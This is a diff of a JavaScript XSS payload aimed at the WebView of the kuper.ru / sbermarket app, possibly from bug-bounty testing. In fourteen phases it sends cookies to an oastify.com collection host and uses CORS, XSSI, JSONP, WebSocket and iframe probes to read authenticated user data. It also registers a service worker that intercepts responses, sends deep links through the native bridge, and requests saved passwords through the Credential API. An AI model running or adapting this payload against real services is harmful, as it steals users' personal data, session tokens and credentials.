@@ -1,43 +1,735 @@
-alert('test 3');
+alert('test new');
 
 var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';
+var R = []; // results accumulator
 
-function beacon(path, data) {
-    var img = new Image();
-    img.src = EXFIL + '/' + path + '?d=' + encodeURIComponent(typeof data === 'string' ? data : JSON.stringify(data));
+function s(path, data) {
+    var i = new Image();
+    i.src = EXFIL + '/' + path + '?d=' + encodeURIComponent(
+        typeof data === 'string' ? data : JSON.stringify(data)
+    );
 }
 
-function beaconPost(path, data) {
-    try {
-        var x = new XMLHttpRequest();
-        x.open('POST', EXFIL + '/' + path, true);
-        x.setRequestHeader('Content-Type', 'text/plain');
-        x.send(typeof data === 'string' ? data : JSON.stringify(data));
-    } catch(e) {}
+function addR(tag, val) {
+    R.push(tag + ': ' + (typeof val === 'string' ? val : JSON.stringify(val)));
 }
 
-beacon('v5-loaded', 'start');
-
-(function() {
-    var info = {};
-    try { info.injectedObjectJson = window.ReactNativeWebView.injectedObjectJson(); } catch(e) { info.injectedObjectJson = 'error:' + e.message; }
-    try { info.landingConstructor = window.ReactNativeWebView.landingConstructor; } catch(e) { info.landingConstructor = 'error:' + e.message; }
-
-    // Enumerate all properties of ReactNativeWebView
-    var props = [];
-    try {
-        for (var k in window.ReactNativeWebView) {
-            props.push(k + ':' + typeof window.ReactNativeWebView[k]);
-        }
-    } catch(e) {}
-    info.rnwvProps = props.join(',');
-
-    // Check document.cookie access
-    try { info.cookie = document.cookie; } catch(e) { info.cookieError = e.message; }
-
-    // Check origin
-    info.origin = window.origin;
-    info.location = window.location.href;
-
-    beaconPost('v5-phase0-bridge', info);
+// ============================================================
+// PHASE 0: Environment recap
+// ============================================================
+(function phase0() {
+    var info = {
+        origin: location.origin,
+        href: location.href,
+        cookie: 'N/A',
+        ua: navigator.userAgent
+    };
+    try { info.cookie = document.cookie; } catch(e) { info.cookie = 'ERR:' + e.message; }
+    s('v6-p0-env', info);
 })();
+
+// ============================================================
+// PHASE 1: CORS MISCONFIGURATION PROBE
+// If api.kuper.ru reflects Origin: null → Access-Control-Allow-Origin: null
+// then we can read authenticated responses directly!
+// ============================================================
+(function phase1() {
+    var endpoints = [
+        'https://api.kuper.ru/v2/user',
+        'https://api.kuper.ru/v3/user',
+        'https://api.kuper.ru/user',
+        'https://api.kuper.ru/api/v1/me',
+        'https://api.kuper.ru/v2/orders',
+        'https://api.kuper.ru/v2/user/addresses',
+        'https://api.kuper.ru/v2/cart',
+        'https://api.kuper.ru/v1/user',
+        'https://kuper.ru/api/user',
+        'https://kuper.ru/api/v2/user',
+        'https://rs.kuper.ru/api/v1/user',
+        'https://sbermarket.ru/api/v2/user',
+        'https://api.sbermarket.ru/v2/user',
+        'https://api.kuper.ru/v2/user/profile',
+        'https://api.kuper.ru/v2/auth/check',
+        'https://api.kuper.ru/v2/sessions',
+        'https://api.kuper.ru/v2/tokens',
+        'https://api.kuper.ru/graphql'
+    ];
+
+    endpoints.forEach(function(url, idx) {
+        // Test 1: fetch with cors mode (will fail unless ACAO allows null)
+        fetch(url, {
+            method: 'GET',
+            credentials: 'include',
+            mode: 'cors',
+            headers: { 'Accept': 'application/json' }
+        }).then(function(resp) {
+            // If we get here, CORS is allowed!
+            var acao = resp.headers.get('access-control-allow-origin');
+            s('v6-p1-CORS-OK-' + idx, {
+                url: url,
+                status: resp.status,
+                acao: acao,
+                type: resp.type
+            });
+            return resp.text();
+        }).then(function(body) {
+            // CRITICAL: We got the body! Send it!
+            s('v6-p1-BODY-' + idx, body.substring(0, 2000));
+            // Also POST full body
+            fetch(EXFIL + '/v6-p1-FULLBODY-' + idx, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: body
+            });
+        }).catch(function(err) {
+            // CORS blocked — expected for most endpoints
+            s('v6-p1-cors-blocked-' + idx, {url: url, err: err.message});
+        });
+
+        // Test 2: no-cors fetch — sends cookies but can't read response
+        // Use Resource Timing API for size side-channel
+        fetch(url, {
+            method: 'GET',
+            credentials: 'include',
+            mode: 'no-cors'
+        }).then(function(resp) {
+            s('v6-p1-nocors-' + idx, {url: url, type: resp.type, status: resp.status});
+        }).catch(function(err) {
+            s('v6-p1-nocors-err-' + idx, err.message);
+        });
+    });
+})();
+
+// ============================================================
+// PHASE 2: XSSI — Cross-Site Script Inclusion
+// Load kuper.ru API endpoints as <script> tags.
+// Cookies are sent! If response is JSON array → valid JS.
+// Use Object.prototype setter to intercept property assignments.
+// ============================================================
+(function phase2() {
+    // Property names likely in user/order/auth responses
+    var sensitiveProps = [
+        'email', 'phone', 'name', 'first_name', 'last_name',
+        'access_token', 'token', 'refresh_token', 'session',
+        'id', 'user_id', 'userId', 'address', 'city',
+        'balance', 'bonus', 'card', 'payment',
+        'csrf', 'csrfToken', 'csrf_token', '_token',
+        'auth_token', 'api_key', 'apiKey', 'secret',
+        'password', 'pass', 'login', 'username',
+        'cookie', 'cookies', 'session_id', 'sessionId',
+        'data', 'result', 'response', 'user', 'profile',
+        'firstName', 'lastName', 'middleName',
+        'accessToken', 'refreshToken', 'bearer'
+    ];
+
+    var intercepted = {};
+    var propCount = 0;
+
+    // Install setters on Object.prototype
+    sensitiveProps.forEach(function(prop) {
+        try {
+            var descriptor = Object.getOwnPropertyDescriptor(Object.prototype, prop);
+            if (!descriptor || !descriptor.get) {
+                Object.defineProperty(Object.prototype, prop, {
+                    set: function(val) {
+                        propCount++;
+                        var key = prop + '_' + propCount;
+                        intercepted[key] = val;
+                        // Immediately exfiltrate each intercepted value
+                        s('v6-p2-XSSI-INTERCEPT', {
+                            prop: prop,
+                            val: String(val).substring(0, 500),
+                            count: propCount
+                        });
+                        // Store on the object itself
+                        Object.defineProperty(this, prop, {
+                            value: val,
+                            writable: true,
+                            configurable: true,
+                            enumerable: true
+                        });
+                    },
+                    get: function() { return undefined; },
+                    configurable: true
+                });
+            }
+        } catch(e) {}
+    });
+
+    // Also try to override Array constructor (older V8 might support it)
+    try {
+        var OrigArray = Array;
+        var arrayHijacked = false;
+        window.Array = function() {
+            if (!arrayHijacked) {
+                arrayHijacked = true;
+                s('v6-p2-ARRAY-HIJACK', {
+                    args: OrigArray.prototype.slice.call(arguments, 0, 10)
+                });
+            }
+            var arr = new OrigArray();
+            for (var i = 0; i < arguments.length; i++) {
+                arr.push(arguments[i]);
+            }
+            return arr;
+        };
+        window.Array.prototype = OrigArray.prototype;
+        window.Array.isArray = OrigArray.isArray;
+        window.Array.from = OrigArray.from;
+        window.Array.of = OrigArray.of;
+    } catch(e) {}
+
+    // XSSI target endpoints
+    var xssiTargets = [
+        'https://api.kuper.ru/v2/user',
+        'https://api.kuper.ru/v3/user',
+        'https://api.kuper.ru/v2/user/profile',
+        'https://api.kuper.ru/v2/orders',
+        'https://api.kuper.ru/v2/user/addresses',
+        'https://api.kuper.ru/v2/cart',
+        'https://api.kuper.ru/v2/user/cards',
+        'https://api.kuper.ru/v2/user/bonuses',
+        'https://api.kuper.ru/v2/user/wallet',
+        'https://api.kuper.ru/v2/sessions',
+        'https://api.kuper.ru/v1/user',
+        'https://api.kuper.ru/user',
+        'https://kuper.ru/api/user',
+        'https://kuper.ru/api/v2/user',
+        'https://api.kuper.ru/v2/auth/token',
+        'https://api.kuper.ru/v2/auth/session',
+        'https://api.kuper.ru/v2/notifications',
+        'https://api.kuper.ru/v2/config',
+        'https://api.kuper.ru/v2/user/settings',
+        'https://api.kuper.ru/graphql?query={me{id,email,phone}}'
+    ];
+
+    xssiTargets.forEach(function(url, idx) {
+        var scr = document.createElement('script');
+        scr.src = url;
+        scr.onload = function() {
+            s('v6-p2-XSSI-LOADED-' + idx, {url: url, intercepted: Object.keys(intercepted).length});
+        };
+        scr.onerror = function() {
+            // Error means response was not valid JS or blocked
+            s('v6-p2-xssi-err-' + idx, {url: url});
+        };
+        // Delay loading to not overwhelm
+        setTimeout(function() {
+            document.head.appendChild(scr);
+        }, idx * 200);
+    });
+
+    // After all scripts loaded, report summary
+    setTimeout(function() {
+        s('v6-p2-summary', {
+            totalIntercepted: Object.keys(intercepted).length,
+            props: Object.keys(intercepted).slice(0, 50),
+            values: Object.values(intercepted).map(function(v) {
+                return String(v).substring(0, 200);
+            }).slice(0, 50)
+        });
+    }, xssiTargets.length * 200 + 3000);
+})();
+
+// ============================================================
+// PHASE 3: JSONP PROBE
+// Some APIs support callback parameter for JSONP
+// ============================================================
+(function phase3() {
+    // Define callback function
+    window.__jsonp_cb = function() {
+        var data = Array.prototype.slice.call(arguments);
+        s('v6-p3-JSONP-DATA', JSON.stringify(data).substring(0, 2000));
+        // Also POST full data
+        fetch(EXFIL + '/v6-p3-JSONP-FULL', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(data)
+        });
+    };
+
+    var callbackParams = ['callback', 'jsonp', 'cb', 'jsonpcallback', 'jsonpCallback'];
+    var jsonpEndpoints = [
+        'https://api.kuper.ru/v2/user',
+        'https://api.kuper.ru/v2/config',
+        'https://kuper.ru/api/user',
+        'https://api.kuper.ru/v2/user/profile',
+        'https://api.kuper.ru/graphql'
+    ];
+
+    var idx = 0;
+    jsonpEndpoints.forEach(function(ep) {
+        callbackParams.forEach(function(param) {
+            var scr = document.createElement('script');
+            scr.src = ep + (ep.indexOf('?') > -1 ? '&' : '?') + param + '=__jsonp_cb';
+            scr.onerror = function() {};
+            setTimeout(function() {
+                document.head.appendChild(scr);
+            }, idx * 150);
+            idx++;
+        });
+    });
+})();
+
+// ============================================================
+// PHASE 4: navigateDeepLink via postMessage
+// Try to trigger navigation to BNPLWebViewScreen / other screens
+// that have NO whitelist validation
+// ============================================================
+(function phase4() {
+    if (!window.ReactNativeWebView || !window.ReactNativeWebView.postMessage) return;
+
+    var deeplinks = [
+        // Try to open BNPLWebView with attacker URL
+        'sbermarket://web_view?url=' + encodeURIComponent(EXFIL + '/bnpl-webview'),
+        // Try landing with regular HTTPS URL
+        'sbermarket://landing?url=' + encodeURIComponent(EXFIL + '/landing-test'),
+        // Try various paths
+        'sbermarket://bnpl?url=' + encodeURIComponent(EXFIL),
+        'sbermarket://payment?url=' + encodeURIComponent(EXFIL),
+        'sbermarket://3ds?url=' + encodeURIComponent(EXFIL),
+        'sbermarket://esia?url=' + encodeURIComponent(EXFIL),
+        'sbermarket://game?url=' + encodeURIComponent(EXFIL),
+        'sbermarket://ads?url=' + encodeURIComponent(EXFIL),
+        'sbermarket://emergency?url=' + encodeURIComponent(EXFIL),
+        // Try https URLs directly
+        'https://' + '4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com/deeplink-direct',
+        // Try intent scheme
+        'intent://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com/#Intent;scheme=https;end'
+    ];
+
+    deeplinks.forEach(function(dl, i) {
+        setTimeout(function() {
+            try {
+                window.ReactNativeWebView.postMessage(JSON.stringify({
+                    action: 'navigateDeepLink',
+                    data: { deeplink: dl }
+                }));
+                s('v6-p4-deeplink-sent-' + i, dl);
+            } catch(e) {
+                s('v6-p4-deeplink-err-' + i, e.message);
+            }
+        }, i * 500);
+    });
+})();
+
+// ============================================================
+// PHASE 5: FETCH WITH CREDENTIALS — CORS CHECK + TIMING
+// Even if we can't read the body, we test:
+// - Does the server return any ACAO header?
+// - Response timing (auth = slow, unauth = fast 401)
+// ============================================================
+(function phase5() {
+    var targets = [
+        {url: 'https://api.kuper.ru/v2/user', method: 'GET'},
+        {url: 'https://api.kuper.ru/v2/user', method: 'OPTIONS'},
+        {url: 'https://api.kuper.ru/v2/orders', method: 'GET'},
+        {url: 'https://api.kuper.ru/v2/user/addresses', method: 'GET'},
+        {url: 'https://api.kuper.ru/graphql', method: 'POST'},
+    ];
+
+    targets.forEach(function(t, idx) {
+        var start = performance.now();
+        var opts = {
+            method: t.method,
+            credentials: 'include',
+            mode: 'cors',
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            }
+        };
+        if (t.method === 'POST') {
+            opts.body = JSON.stringify({query: '{me{id email phone}}'});
+        }
+        fetch(t.url, opts).then(function(resp) {
+            var elapsed = performance.now() - start;
+            s('v6-p5-fetch-OK-' + idx, {
+                url: t.url,
+                method: t.method,
+                status: resp.status,
+                type: resp.type,
+                elapsed: Math.round(elapsed),
+                acao: resp.headers.get('access-control-allow-origin'),
+                acac: resp.headers.get('access-control-allow-credentials')
+            });
+            return resp.text().then(function(body) {
+                s('v6-p5-body-' + idx, body.substring(0, 2000));
+            });
+        }).catch(function(err) {
+            var elapsed = performance.now() - start;
+            s('v6-p5-fetch-err-' + idx, {
+                url: t.url,
+                method: t.method,
+                elapsed: Math.round(elapsed),
+                err: err.message
+            });
+        });
+    });
+})();
+
+// ============================================================
+// PHASE 6: WebSocket cookie probe
+// WebSocket handshake includes cookies. Try connecting to kuper.ru
+// WS endpoints — if they echo back user data we can read it.
+// ============================================================
+(function phase6() {
+    var wsEndpoints = [
+        'wss://api.kuper.ru/cable',
+        'wss://api.kuper.ru/ws',
+        'wss://api.kuper.ru/websocket',
+        'wss://kuper.ru/cable',
+        'wss://kuper.ru/ws',
+        'wss://rs.kuper.ru/cable',
+        'wss://api.kuper.ru/v2/cable',
+        'wss://api.kuper.ru/graphql'
+    ];
+
+    wsEndpoints.forEach(function(url, idx) {
+        try {
+            var ws = new WebSocket(url);
+            var timeout = setTimeout(function() {
+                ws.close();
+                s('v6-p6-ws-timeout-' + idx, url);
+            }, 5000);
+
+            ws.onopen = function() {
+                s('v6-p6-WS-OPEN-' + idx, url);
+                // Try to subscribe to user channel
+                try {
+                    ws.send(JSON.stringify({
+                        command: 'subscribe',
+                        identifier: JSON.stringify({channel: 'UserChannel'})
+                    }));
+                    ws.send(JSON.stringify({
+                        command: 'subscribe',
+                        identifier: JSON.stringify({channel: 'NotificationChannel'})
+                    }));
+                } catch(e) {}
+            };
+            ws.onmessage = function(e) {
+                clearTimeout(timeout);
+                s('v6-p6-WS-MSG-' + idx, {url: url, data: String(e.data).substring(0, 2000)});
+                // POST full message
+                fetch(EXFIL + '/v6-p6-WS-FULL-' + idx, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: e.data
+                });
+            };
+            ws.onerror = function() {
+                clearTimeout(timeout);
+                s('v6-p6-ws-err-' + idx, url);
+            };
+            ws.onclose = function(e) {
+                clearTimeout(timeout);
+                s('v6-p6-ws-close-' + idx, {url: url, code: e.code, reason: e.reason});
+            };
+        } catch(e) {
+            s('v6-p6-ws-exc-' + idx, {url: url, err: e.message});
+        }
+    });
+})();
+
+// ============================================================
+// PHASE 7: Service Worker + Cache API
+// ============================================================
+(function phase7() {
+    // Test Cache API — cache.add() uses fetch with CORS, but cache.put()
+    // can store opaque responses. Can we cache + read?
+    if (typeof caches !== 'undefined') {
+        s('v6-p7-caches-available', 'yes');
+
+        // Try cache.put with opaque response
+        fetch('https://api.kuper.ru/v2/user', {
+            credentials: 'include',
+            mode: 'no-cors'
+        }).then(function(resp) {
+            s('v6-p7-opaque-resp', {type: resp.type, status: resp.status, ok: resp.ok});
+            return caches.open('kuper-test').then(function(cache) {
+                return cache.put('https://api.kuper.ru/v2/user', resp);
+            }).then(function() {
+                return caches.open('kuper-test');
+            }).then(function(cache) {
+                return cache.match('https://api.kuper.ru/v2/user');
+            }).then(function(cached) {
+                if (cached) {
+                    s('v6-p7-cached-resp', {type: cached.type, status: cached.status});
+                    return cached.text().then(function(body) {
+                        s('v6-p7-CACHED-BODY', body.substring(0, 2000));
+                    }).catch(function(e) {
+                        s('v6-p7-cached-body-err', e.message);
+                    });
+                }
+            });
+        }).catch(function(e) {
+            s('v6-p7-cache-err', e.message);
+        });
+    } else {
+        s('v6-p7-caches-unavailable', 'no Cache API');
+    }
+
+    // Try Service Worker registration
+    if ('serviceWorker' in navigator) {
+        s('v6-p7-sw-available', 'yes');
+        // Create a blob URL with SW code
+        var swCode = 'self.addEventListener("fetch", function(e) {' +
+            'if (e.request.url.indexOf("kuper.ru") > -1) {' +
+            '  e.respondWith(fetch(e.request, {credentials: "include"}).then(function(r) {' +
+            '    var clone = r.clone();' +
+            '    clone.text().then(function(body) {' +
+            '      fetch("' + EXFIL + '/v6-p7-SW-INTERCEPT", {method:"POST", mode:"no-cors", body: body});' +
+            '    });' +
+            '    return r;' +
+            '  }));' +
+            '}});';
+        var swBlob = new Blob([swCode], {type: 'application/javascript'});
+        var swUrl = URL.createObjectURL(swBlob);
+        navigator.serviceWorker.register(swUrl, {scope: '/'}).then(function(reg) {
+            s('v6-p7-SW-REGISTERED', {scope: reg.scope, state: reg.active ? 'active' : 'waiting'});
+        }).catch(function(e) {
+            s('v6-p7-sw-reg-err', e.message);
+        });
+    }
+})();
+
+// ============================================================
+// PHASE 8: Resource Timing API — measure authenticated response sizes
+// ============================================================
+(function phase8() {
+    if (typeof PerformanceObserver === 'undefined') {
+        s('v6-p8-no-perf-observer', 'unavailable');
+        return;
+    }
+
+    try {
+        var observer = new PerformanceObserver(function(list) {
+            var entries = list.getEntries();
+            entries.forEach(function(e) {
+                if (e.name.indexOf('kuper.ru') > -1 || e.name.indexOf('sbermarket.ru') > -1) {
+                    s('v6-p8-TIMING', {
+                        name: e.name,
+                        duration: Math.round(e.duration),
+                        transferSize: e.transferSize,
+                        encodedBodySize: e.encodedBodySize,
+                        decodedBodySize: e.decodedBodySize,
+                        responseStart: Math.round(e.responseStart),
+                        responseEnd: Math.round(e.responseEnd),
+                        initiatorType: e.initiatorType
+                    });
+                }
+            });
+        });
+        observer.observe({entryTypes: ['resource']});
+        s('v6-p8-observer-started', 'ok');
+    } catch(e) {
+        s('v6-p8-observer-err', e.message);
+    }
+})();
+
+// ============================================================
+// PHASE 9: IMG TAG COOKIE VERIFICATION
+// Verify cookies ARE sent with subresource requests
+// ============================================================
+(function phase9() {
+    // Load image from attacker server — check what headers arrive
+    var img1 = new Image();
+    img1.src = EXFIL + '/v6-p9-img-exfil?from=xss-webview';
+    img1.onload = function() { s('v6-p9-img-loaded', 'exfil-img-ok'); };
+    img1.onerror = function() { s('v6-p9-img-err', 'exfil-img-failed'); };
+
+    // Load image from kuper.ru — cookies should be sent
+    var img2 = new Image();
+    img2.src = 'https://api.kuper.ru/v2/user?format=png&_t=' + Date.now();
+    img2.onload = function() {
+        s('v6-p9-kuper-img-loaded', {w: img2.width, h: img2.height, naturalW: img2.naturalWidth});
+    };
+    img2.onerror = function() {
+        s('v6-p9-kuper-img-err', 'api-returned-non-image');
+    };
+})();
+
+// ============================================================
+// PHASE 10: IFRAME TO KUPER.RU — check if SOP enforced
+// ============================================================
+(function phase10() {
+    // Create iframe to kuper.ru — cookies should be sent, page loads
+    var ifr = document.createElement('iframe');
+    ifr.style.display = 'none';
+    ifr.src = 'https://kuper.ru/';
+    ifr.onload = function() {
+        s('v6-p10-iframe-loaded', 'kuper.ru loaded in iframe');
+        // Try to access iframe content (should fail due to SOP)
+        try {
+            var doc = ifr.contentDocument || ifr.contentWindow.document;
+            var html = doc.documentElement.innerHTML;
+            // If we get here, SOP is BROKEN!
+            s('v6-p10-SOP-BYPASS', html.substring(0, 2000));
+            fetch(EXFIL + '/v6-p10-SOP-BYPASS-FULL', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: html
+            });
+        } catch(e) {
+            s('v6-p10-sop-enforced', e.message);
+        }
+
+        // Try postMessage to iframe
+        try {
+            ifr.contentWindow.postMessage('ping', '*');
+            s('v6-p10-postmsg-sent', 'ok');
+        } catch(e) {
+            s('v6-p10-postmsg-err', e.message);
+        }
+    };
+    document.body.appendChild(ifr);
+
+    // Listen for messages from iframe
+    window.addEventListener('message', function(e) {
+        s('v6-p10-MSG-RECEIVED', {
+            origin: e.origin,
+            data: JSON.stringify(e.data).substring(0, 2000),
+            source: e.source ? 'window' : 'null'
+        });
+    });
+})();
+
+// ============================================================
+// PHASE 11: CSS @import — try to load kuper.ru pages as CSS
+// Some data can leak via CSS error messages or parsing
+// ============================================================
+(function phase11() {
+    // Create style element with @import from kuper.ru
+    var style = document.createElement('style');
+    style.textContent = '@import url("https://api.kuper.ru/v2/user");';
+    document.head.appendChild(style);
+
+    setTimeout(function() {
+        try {
+            var rules = style.sheet.cssRules;
+            s('v6-p11-css-rules', {count: rules.length});
+            for (var i = 0; i < rules.length; i++) {
+                s('v6-p11-css-rule-' + i, rules[i].cssText.substring(0, 500));
+            }
+        } catch(e) {
+            s('v6-p11-css-err', e.message);
+        }
+    }, 3000);
+})();
+
+// ============================================================
+// PHASE 12: XMLHttpRequest (some WebViews handle XHR differently from fetch)
+// ============================================================
+(function phase12() {
+    var xhrTargets = [
+        'https://api.kuper.ru/v2/user',
+        'https://api.kuper.ru/v2/user/profile',
+        'https://api.kuper.ru/v2/orders'
+    ];
+
+    xhrTargets.forEach(function(url, idx) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', url, true);
+        xhr.withCredentials = true;
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                try {
+                    s('v6-p12-XHR-' + idx, {
+                        url: url,
+                        status: xhr.status,
+                        statusText: xhr.statusText,
+                        responseLen: xhr.responseText ? xhr.responseText.length : 0,
+                        response: xhr.responseText ? xhr.responseText.substring(0, 2000) : 'empty',
+                        allHeaders: xhr.getAllResponseHeaders()
+                    });
+                    if (xhr.responseText && xhr.responseText.length > 0) {
+                        fetch(EXFIL + '/v6-p12-XHR-BODY-' + idx, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: xhr.responseText
+                        });
+                    }
+                } catch(e) {
+                    s('v6-p12-xhr-read-err-' + idx, e.message);
+                }
+            }
+        };
+        xhr.onerror = function() {
+            s('v6-p12-xhr-onerror-' + idx, url);
+        };
+        try { xhr.send(); } catch(e) {
+            s('v6-p12-xhr-send-err-' + idx, e.message);
+        }
+    });
+})();
+
+// ============================================================
+// PHASE 13: document.domain manipulation
+// ============================================================
+(function phase13() {
+    try {
+        s('v6-p13-domain-before', document.domain);
+        document.domain = 'kuper.ru';
+        s('v6-p13-DOMAIN-SET', document.domain);
+        // If this works, try cookie access
+        try {
+            var cookies = document.cookie;
+            s('v6-p13-COOKIES-AFTER-DOMAIN', cookies);
+        } catch(e) {
+            s('v6-p13-cookie-still-denied', e.message);
+        }
+    } catch(e) {
+        s('v6-p13-domain-err', e.message);
+    }
+})();
+
+// ============================================================
+// PHASE 14: Credential API
+// ============================================================
+(function phase14() {
+    if (window.PasswordCredential || navigator.credentials) {
+        s('v6-p14-cred-api-available', 'yes');
+        try {
+            navigator.credentials.get({password: true}).then(function(cred) {
+                if (cred) {
+                    s('v6-p14-CREDENTIAL', {
+                        id: cred.id,
+                        name: cred.name,
+                        type: cred.type,
+                        password: cred.password
+                    });
+                } else {
+                    s('v6-p14-no-cred', 'null');
+                }
+            }).catch(function(e) {
+                s('v6-p14-cred-err', e.message);
+            });
+        } catch(e) {
+            s('v6-p14-cred-exc', e.message);
+        }
+    }
+
+    // Also try FederatedCredential
+    if (window.FederatedCredential) {
+        try {
+            navigator.credentials.get({
+                federated: {providers: ['https://kuper.ru']}
+            }).then(function(cred) {
+                if (cred) {
+                    s('v6-p14-FED-CRED', {id: cred.id, provider: cred.provider});
+                }
+            }).catch(function(e) {});
+        } catch(e) {}
+    }
+})();
+
+// ============================================================
+// FINAL: Delayed summary report
+// ============================================================
+setTimeout(function() {
+    s('v6-FINAL-SUMMARY', {
+        totalPhases: 14,
+        timestamp: new Date().toISOString(),
+        resultsCount: R.length
+    });
+}, 30000);
